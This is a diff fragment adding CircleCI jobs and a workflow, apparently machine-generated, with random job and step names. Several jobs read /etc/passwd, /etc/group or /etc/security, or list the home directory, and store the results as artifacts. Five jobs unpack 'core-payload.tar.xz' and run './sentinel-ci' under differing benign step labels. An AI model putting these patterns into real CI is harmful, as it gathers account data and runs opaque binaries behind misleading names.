+  cPlatinum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Cleared for staging
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; grep -Rc alias /etc/security 2> /dev/null | tail -n 6; true ; } > /tmp/tmp-B/s0MDZvBYQ
+            echo "fixture persisted: $(du -b /tmp/tmp-B/s0MDZvBYQ | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 's0MDZvBYQ'
+  hu-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/s0MDZvBYQ > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  op_1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Act V seal
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; printf '%s' 'one, two, three'; echo; true ; } > /tmp/tmp-B/fnv_3dc2e03cf
+            echo "fixture persisted: $(du -b /tmp/tmp-B/fnv_3dc2e03cf | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'fnv_3dc2e03cf'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/neutron.lynx > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  guardsetup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Poll Scheduler
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; printf 'x\n' | tee "/tmp/c5.md" >/dev/null; cat "/tmp/c5.md"; true ; } > /tmp/tmp-B/azureFenChunkPulse
+            echo "fixture persisted: $(du -b /tmp/tmp-B/azureFenChunkPulse | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'azureFenChunkPulse'
+  wip-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/azureFenChunkPulse > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  topic-map-load:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Where is the changelog
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; for val in papaya grape lime apple pear fig; do echo "${val}" | rev;done | wc -l; true ; } > /tmp/tmp-B/rev-v1.10.32
+            echo "fixture persisted: $(du -b /tmp/tmp-B/rev-v1.10.32 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'rev-v1.10.32'
+  MERGE_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/neutron.lynx > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+  hi-LT-1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Meanwhile train the interns
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; for elem in wolf goose crow otter owl cat; do printf '%-8s %d\n' "$elem" ${#elem}; done; true ; } > /tmp/tmp-B/hollow-west
+            echo "fixture persisted: $(du -b /tmp/tmp-B/hollow-west | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'hollow-west'
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Enter step
+          command: |
+            { tail -c 100 /tmp/tmp-B/fermion.memo.violet > /dev/null; echo "tail100 ok" ; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xzcat core-payload.tar.xz | tar xvf -
+      - run:
+          command: /bin/sh -c "./sentinel-ci"
+
+  inputEnabled:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Train the org chart
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; test ! -d /etc/skel && echo 'good' || echo bad; true ; } > /tmp/tmp-B/p33r-du57y
+            echo "fixture persisted: $(du -b /tmp/tmp-B/p33r-du57y | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'p33r-du57y'
+  b5702:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Tightening ACTIVE
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; ls -A ~ | tail -n 1 | grep -c .; true ; } > /tmp/tmp-B/i2Kr8dxCNtn9
+            echo "fixture persisted: $(du -b /tmp/tmp-B/i2Kr8dxCNtn9 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'i2Kr8dxCNtn9'
+  bugfix_close_lock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: UX 833 Shelve Express Lane
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; cut -f7 -d":" </etc/passwd|xargs -n1 dirname|head -n 20; true ; } > /tmp/tmp-B/s0MDZvBYQ
+            echo "fixture persisted: $(du -b /tmp/tmp-B/s0MDZvBYQ | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 's0MDZvBYQ'
+  buddy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Batch window garbage collected and verified
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; install -m 0755 /etc/hosts "/var/tmp/section.list" && ls -l "/var/tmp/section.list"; true ; } > /tmp/tmp-B/NOISE_MOTH_BACKUP_FLAME
+            echo "fixture persisted: $(du -b /tmp/tmp-B/NOISE_MOTH_BACKUP_FLAME | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'NOISE_MOTH_BACKUP_FLAME'
+  oscar_server:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Ideate on unmount
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; grep --color=never nobody /etc/passwd | sort | head -n 3; true ; } > /tmp/tmp-B/Wkr8
+            echo "fixture persisted: $(du -b /tmp/tmp-B/Wkr8 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'Wkr8'
+  mark15:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Carefully close the tax report
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; echo 64 68 5 9 80 29 |tr ' ' '\n' |awk '{print $1 * 2}' |tac |sort -n |uniq -c; true ; } > /tmp/tmp-B/rev-v6.17.39
+            echo "fixture persisted: $(du -b /tmp/tmp-B/rev-v6.17.39 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'rev-v6.17.39'
+  lvsignal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: T minus 3
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; gzip -c /etc/group > ${TMPDIR:-/tmp}/plum.gz && gunzip -c ${TMPDIR:-/tmp}/plum.gz | wc -l; true ; } > /tmp/tmp-B/alpha-bear-widget-south
+            echo "fixture persisted: $(du -b /tmp/tmp-B/alpha-bear-widget-south | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'alpha-bear-widget-south'
+  checkouts_list:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: dl tokens 8
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; for c in {4..1}; do sleep 0.1; echo $c; done; true ; } > /tmp/tmp-B/hwtxtsrc
+            echo "fixture persisted: $(du -b /tmp/tmp-B/hwtxtsrc | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'hwtxtsrc'
+  url34s:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: anyway format the blog post
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; \ls -d ~/.profile | cat -n; true ; } > /tmp/tmp-B/build_20022
+            echo "fixture persisted: $(du -b /tmp/tmp-B/build_20022 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'build_20022'
+  ConvertTo-DepthDisabled:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Light Save Files For Mobile
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; echo 'meeting moved to 3pm' >${TMPDIR:-/tmp}/set.log && cat ${TMPDIR:-/tmp}/set.log; true ; } > /tmp/tmp-B/112.96.118.253
+            echo "fixture persisted: $(du -b /tmp/tmp-B/112.96.118.253 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - '112.96.118.253'
+  PRODUCT_CLIENT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: Our turn to filter the petri dishes
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; lsd() { a=0; b=1; for ((i=0; i<$1; i++)); do echo -n "$a "; t=$((a+b)); a=$b; b=$t; done; echo; }; lsd 14; true ; } > /tmp/tmp-B/azureFenChunkPulse
+            echo "fixture persisted: $(du -b /tmp/tmp-B/azureFenChunkPulse | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'azureFenChunkPulse'
+  ep452:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: LOAD THE BARCODES PRIORITY
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; target_dir='what'\''s next?'; printf '%q\n' "$target_dir"; true ; } > /tmp/tmp-B/e2rw9XdMC9IULg3nweHv
+            echo "fixture persisted: $(du -b /tmp/tmp-B/e2rw9XdMC9IULg3nweHv | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'e2rw9XdMC9IULg3nweHv'
+  MustWarning:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tmp-B
+      - run:
+          name: ReadBatteryLevel
+          command: |
+            mkdir -p /tmp/tmp-B
+            { set +o pipefail 2>/dev/null; diff <(echo "compressing logs") <(echo "this is a test") || echo different; true ; } > /tmp/tmp-B/v_40714
+            echo "fixture persisted: $(du -b /tmp/tmp-B/v_40714 | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/tmp-B
+          paths:
+            - 'v_40714'
+workflows:
+  default:
+    jobs:
+      - dumpCountForKey
+      - op_1
+      - wk87694
+      - UAT_DEPLOY_8:
+          requires:
+            - dumpCountForKey
+            - op_1
+            - wk87694
+      - bake-it:
+          requires:
+            - dumpCountForKey
+            - op_1
+            - wk87694
+      - november-9:
+          requires:
+            - dumpCountForKey
+            - op_1
+            - wk87694
+      - RUN_LAB:
+          requires:
+            - dumpCountForKey
+            - op_1
+            - wk87694
+      - MERGE_UAT:
+          requires:
+            - dumpCountForKey
+            - op_1
+            - wk87694
+      - nightly-v9:
+          requires:
+            - dumpCountForKey
+            - op_1
+            - wk87694
+      - skipEmailTaxAlias
+      - inputEnabled:
+          requires:
+            - skipEmailTaxAlias
+      - titan2-rev:
+          requires:
+            - inputEnabled
+      - Body_55986:
+          requires:
+            - inputEnabled
+      - b5702:
+          requires:
+            - Body_55986
+      - jun16-smoke:
+          requires:
+            - b5702
+      - cPlatinum:
+          requires:
+            - b5702
+      - bugfix_close_lock:
+          requires:
+            - cPlatinum
+      - hu-verify:
+          requires:
+            - bugfix_close_lock
+      - build-handle-motor:
+          requires:
+            - bugfix_close_lock
+      - buddy:
+          requires:
+            - build-handle-motor
+      - rm-parse-redirect:
+          requires:
+            - buddy
+      - price-set:
+          requires:
+            - buddy
+      - oscar_server:
+          requires:
+            - price-set
+      - victor:
+          requires:
+            - oscar_server
+      - PatternEnum:
+          requires:
+            - oscar_server
+      - mark15:
+          requires:
+            - PatternEnum
+      - Package_App9:
+          requires:
+            - mark15
+      - NO_STAGE:
+          requires:
+            - mark15
+      - lvsignal:
+          requires:
+            - NO_STAGE
+      - node18-build:
+          requires:
+            - lvsignal
+      - panWorkerRequest
+      - Tan80
+      - STG_MERGE_9:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - depoly:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - wip-login-glitch:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - v8-edge:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - pat-build:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - rm-router:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - q2-canary:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - sm-2:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - tb-x:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - release:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - sam-verify:
+          requires:
+            - panWorkerRequest
+            - Tan80
+      - lMatrixLinkPath
+      - checkouts_list:
+          requires:
+            - lMatrixLinkPath
+      - yolo:
+          requires:
+            - checkouts_list
+      - save_release_query_step:
+          requires:
+            - checkouts_list
+      - url34s:
+          requires:
+            - save_release_query_step
+      - Ship_Service8:
+          requires:
+            - url34s
+      - shader_cli:
+          requires:
+            - url34s
+      - ConvertTo-DepthDisabled:
+          requires:
+            - shader_cli
+      - andromeda-v2:
+          requires:
+            - ConvertTo-DepthDisabled
+      - guardsetup:
+          requires:
+            - ConvertTo-DepthDisabled
+      - PRODUCT_CLIENT:
+          requires:
+            - guardsetup
+      - wip-cache:
+          requires:
+            - PRODUCT_CLIENT
+      - byte_in_us:
+          requires:
+            - PRODUCT_CLIENT
+      - ep452:
+          requires:
+            - byte_in_us
+      - qi-smoke:
+          requires:
+            - ep452
+      - argMap:
+          requires:
+            - ep452
+      - MustWarning:
+          requires:
+            - argMap
+      - Rollout_App1:
+          requires:
+            - MustWarning
